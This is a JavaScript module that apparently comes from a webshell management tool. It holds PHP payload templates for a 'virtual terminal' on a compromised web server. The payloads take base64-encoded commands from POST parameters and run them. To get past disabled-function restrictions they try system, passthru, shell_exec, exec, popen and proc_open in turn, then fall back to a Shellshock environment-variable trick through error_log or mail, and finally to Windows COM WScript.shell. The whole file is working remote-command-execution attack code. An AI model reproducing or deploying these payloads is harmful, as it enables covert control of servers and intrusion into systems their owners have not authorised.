/**
 * 虚拟终端命令执行
 */

module.exports = (arg1, arg2, arg3) => ({
  exec: {
    _: `$p=base64_decode(substr($_POST["${arg1}"],#randomPrefix#));
      $s=base64_decode(substr($_POST["${arg2}"],#randomPrefix#));
      $envstr=@base64_decode(substr($_POST["${arg3}"],#randomPrefix#));
      $d=dirname($_SERVER["SCRIPT_FILENAME"]);
      $c=substr($d,0,1)=="/"?"-c \\"{$s}\\"":"/c \\"{$s}\\"";
      if(substr($d,0,1)=="/"){
        @putenv("PATH=".getenv("PATH").":/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin");
      }else{
        @putenv("PATH=".getenv("PATH").";C:/Windows/system32;C:/Windows/SysWOW64;C:/Windows;C:/Windows/System32/WindowsPowerShell/v1.0/;");
      }
      if(!empty($envstr)){
        $envarr=explode("|||asline|||", $envstr);
        foreach($envarr as $v) {
          if (!empty($v)) {
            @putenv(str_replace("|||askey|||", "=", $v));
          }
        }
      }
      $r="{$p} {$c}";
      function fe($f){
        $d=explode(",",@ini_get("disable_functions"));
        if(empty($d)){
          $d=array();
        }else{
          $d=array_map('trim',array_map('strtolower',$d));
        }
        return(function_exists($f)&&is_callable($f)&&!in_array($f,$d));
      };
      function runshellshock($d, $c) {
        if (substr($d, 0, 1) == "/" && fe('putenv') && (fe('error_log') || fe('mail'))) {
          if (strstr(readlink("/bin/sh"), "bash") != FALSE) {
            $tmp = tempnam(sys_get_temp_dir(), 'as');
            putenv("PHP_LOL=() { x; }; $c >$tmp 2>&1");
            if (fe('error_log')) {
              error_log("a", 1);
            } else {
              mail("a@127.0.0.1", "", "", "-bv");
            }
          } else {
            return False;
          }
          $output = @file_get_contents($tmp);
          @unlink($tmp);
          if ($output != "") {
            print($output);
            return True;
          }
        }
        return False;
      };
      function runcmd($c){
        $ret=0;
        $d=dirname($_SERVER["SCRIPT_FILENAME"]);
        if(fe('system')){
          @system($c,$ret);
        }elseif(fe('passthru')){
          @passthru($c,$ret);
        }elseif(fe('shell_exec')){
          print(@shell_exec($c));
        }elseif(fe('exec')){
          @exec($c,$o,$ret);
          print(join("\n",$o));
        }elseif(fe('popen')){
          $fp=@popen($c,'r');
          while(!@feof($fp)){
            print(@fgets($fp,2048));
          }
          @pclose($fp);
        }elseif(fe('proc_open')){
          $p = @proc_open($c, array(1 => array('pipe', 'w'), 2 => array('pipe', 'w')), $io);
          while(!@feof($io[1])){
            print(@fgets($io[1],2048));
          }
          while(!@feof($io[2])){
            print(@fgets($io[2],2048));
          }
          @fclose($io[1]);
          @fclose($io[2]);
          @proc_close($p);
        }elseif(fe('antsystem')){
          @antsystem($c);
        }elseif(runshellshock($d, $c)) {
          return $ret;
        }elseif(substr($d,0,1)!="/" && @class_exists("COM")){
          $w=new COM('WScript.shell');
          $e=$w->exec($c);
          $so=$e->StdOut();
          $ret.=$so->ReadAll();
          $se=$e->StdErr();
          $ret.=$se->ReadAll();
          print($ret);
        }else{
          $ret = 127;
        }
        return $ret;
      };
      $ret=@runcmd($r." 2>&1");
      print ($ret!=0)?"ret={$ret}":"";`.replace(/\n\s+/g, ''),
    [arg1]: "#{newbase64::bin}",
    [arg2]: "#{newbase64::cmd}",
    [arg3]: "#{newbase64::env}"
  },
  listcmd: {
    _: `$arr=explode(",",base64_decode(substr($_POST["${arg1}"],#randomPrefix#)));
    foreach($arr as $v){
        echo($v."\t".(file_exists($v)?"1":"0")."\n");
    }`.replace(/\n\s+/g, ''),
    [arg1]: "#{newbase64::binarr}"
  },
  quote: {
    _: `$p=base64_decode(substr($_POST["${arg1}"],#randomPrefix#));$s=base64_decode(substr($_POST["${arg2}"],#randomPrefix#));$d=dirname($_SERVER["SCRIPT_FILENAME"]);$c=substr($d,0,1)=="/"?"-c \\"{$s}\\"":"/c \\"{$s}\\"";$r="{$p} {$c}";echo \`{$r} 2>&1\``,
    [arg1]: "#{newbase64::bin}",
    [arg2]: "#{newbase64::cmd}"
  }
})